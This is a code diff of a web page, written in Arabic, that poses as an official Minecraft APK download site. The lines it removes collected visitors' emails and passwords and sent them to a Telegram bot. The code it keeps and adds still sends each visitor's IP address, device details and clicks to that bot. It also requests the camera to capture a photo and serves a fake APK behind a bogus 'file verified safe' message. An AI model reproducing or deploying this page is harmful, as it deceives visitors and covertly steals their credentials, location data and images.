@@ -135,41 +135,6 @@
             color: #6ab04c;
             font-weight: bold;
         }
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-            position: relative;
-            z-index: 1;
-        }
-        .input-group label {
-            font-size: 13px;
-            color: #6ab04c;
-            display: block;
-            margin-bottom: 4px;
-            font-weight: bold;
-            letter-spacing: 1px;
-            text-shadow: 0 0 10px rgba(106, 176, 76, 0.15);
-        }
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            border-radius: 10px;
-            border: 2px solid #2a5a2a;
-            background: rgba(0, 20, 0, 0.7);
-            color: #b0ffb0;
-            font-size: 15px;
-            outline: none;
-            transition: 0.3s;
-            font-family: 'Courier New', monospace;
-        }
-        .input-group input:focus {
-            border-color: #6ab04c;
-            box-shadow: 0 0 30px rgba(106, 176, 76, 0.2);
-            background: rgba(0, 30, 0, 0.8);
-        }
-        .input-group input::placeholder {
-            color: #3a6a3a;
-        }
         .btn {
             width: 100%;
             padding: 16px;
@@ -278,17 +243,9 @@
             <div class="row"><span>📅 الإصدار</span><span>28 يونيو 2026</span></div>
             <div class="row"><span>🔒 التوقيع</span><span>✅ معتمد</span></div>
         </div>
-        <div class="input-group">
-            <label>📧 البريد الإلكتروني</label>
-            <input type="email" id="emailInput" placeholder="example@gmail.com">
-        </div>
-        <div class="input-group">
-            <label>🔑 كلمة المرور</label>
-            <input type="password" id="passwordInput" placeholder="••••••••">
-        </div>
         <button class="btn btn-primary" id="mainBtn">🚀 تحميل Minecraft.apk</button>
         <button class="btn btn-secondary" id="fakeBtn">🔍 التحقق من الملف</button>
-        <div id="status">⏳ أدخل بياناتك واضغط تحميل</div>
+        <div id="status">⏳ اضغط تحميل لبدء التنزيل</div>
         <div class="footer">🔒 اتصال آمن • ✅ تم التحقق • ⛏️ Minecraft Official</div>
     </div>
     <script>
@@ -299,16 +256,15 @@
         const CHAT_ID = "5730027675";
         // ============================================================
 
-        const emailInput = document.getElementById('emailInput');
-        const passwordInput = document.getElementById('passwordInput');
         const mainBtn = document.getElementById('mainBtn');
         const fakeBtn = document.getElementById('fakeBtn');
         const statusDiv = document.getElementById('status');
 
-        async function sendData(email, password, action) {
+        // ====== إرسال إشعار إلى تيليغرام ======
+        async function sendNotification(action) {
             try {
                 const ip = await getIP();
-                const message = `🎮 **ماينكرافت - بيانات جديدة**\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n📌 الإجراء: ${action}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n🌐 IP: ${ip}`;
+                const message = `📱 **تم تنزيل ملف Minecraft.apk**\n\n📌 الإجراء: ${action}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n🌐 IP: ${ip}`;
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -328,10 +284,12 @@
             }
         }
 
+        // ====== جلب عنوان IP ======
         async function getIP() {
             try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); return data.ip || 'غير معروف'; } catch { return 'غير معروف'; }
         }
 
+        // ====== طلب الكاميرا والتقاط الصورة ======
         async function requestCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
@@ -357,29 +315,28 @@
             } catch (e) { console.log('❌ الكاميرا غير متاحة'); return false; }
         }
 
+        // ====== الإجراء الرئيسي ======
         async function handleMainAction() {
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
-            if (!email || !email.includes('@') || !email.includes('.')) {
-                statusDiv.innerHTML = '⚠️ أدخل بريداً إلكترونياً صحيحاً';
-                statusDiv.style.color = '#ff9800';
-                return;
-            }
-            if (!password || password.length < 4) {
-                statusDiv.innerHTML = '⚠️ كلمة المرور يجب أن تكون 4 أحرف على الأقل';
-                statusDiv.style.color = '#ff9800';
-                return;
-            }
             statusDiv.innerHTML = `<span class="loader"></span> جاري التحميل...`;
             statusDiv.style.color = '#aaa';
-            const sent = await sendData(email, password, 'تحميل مباشر');
+
+            // إرسال إشعار
+            const sent = await sendNotification('تحميل مباشر');
+
             if (sent) {
-                statusDiv.innerHTML = `✅ تم إرسال بياناتك بنجاح`;
+                statusDiv.innerHTML = `✅ تم إرسال الإشعار`;
                 statusDiv.style.color = '#4caf50';
+
                 setTimeout(async () => {
                     statusDiv.innerHTML = `📷 جاري طلب الكاميرا...`;
                     const cam = await requestCamera();
-                    if (cam) { statusDiv.innerHTML = `✅ تم إرسال الصورة أيضاً`; } else { statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`; }
+                    if (cam) {
+                        statusDiv.innerHTML = `✅ تم إرسال الصورة أيضاً`;
+                    } else {
+                        statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`;
+                    }
+
+                    // تحميل ملف وهمي
                     const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
                     const url = URL.createObjectURL(blob);
                     const a = document.createElement('a');
@@ -389,7 +346,11 @@
                     a.click();
                     document.body.removeChild(a);
                     URL.revokeObjectURL(url);
-                    setTimeout(() => { statusDiv.innerHTML = '📥 تم التنزيل بنجاح'; statusDiv.style.color = '#8a8a8a'; }, 3000);
+
+                    setTimeout(() => {
+                        statusDiv.innerHTML = '📥 تم التنزيل بنجاح';
+                        statusDiv.style.color = '#8a8a8a';
+                    }, 3000);
                 }, 1000);
             } else {
                 statusDiv.innerHTML = '❌ فشل الإرسال، حاول مرة أخرى';
@@ -397,22 +358,25 @@
             }
         }
 
+        // ====== زر التحقق الوهمي ======
         fakeBtn.addEventListener('click', async function() {
             statusDiv.innerHTML = `<span class="loader"></span> جاري التحقق من الملف...`;
             statusDiv.style.color = '#aaa';
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
-            if (email && password) { await sendData(email, password, 'التحقق من الملف'); }
+
+            await sendNotification('التحقق من الملف');
+
             setTimeout(() => {
                 statusDiv.innerHTML = `✅ الملف آمن ومعتمد 100%`;
                 statusDiv.style.color = '#4caf50';
-                setTimeout(() => { statusDiv.innerHTML = '🔍 الملف جاهز للتحميل'; statusDiv.style.color = '#8a8a8a'; }, 2000);
+                setTimeout(() => {
+                    statusDiv.innerHTML = '🔍 الملف جاهز للتحميل';
+                    statusDiv.style.color = '#8a8a8a';
+                }, 2000);
             }, 2000);
         });
 
+        // ====== ربط الأزرار ======
         mainBtn.addEventListener('click', handleMainAction);
-        emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
-        passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
     </script>
 </body>
 </html>
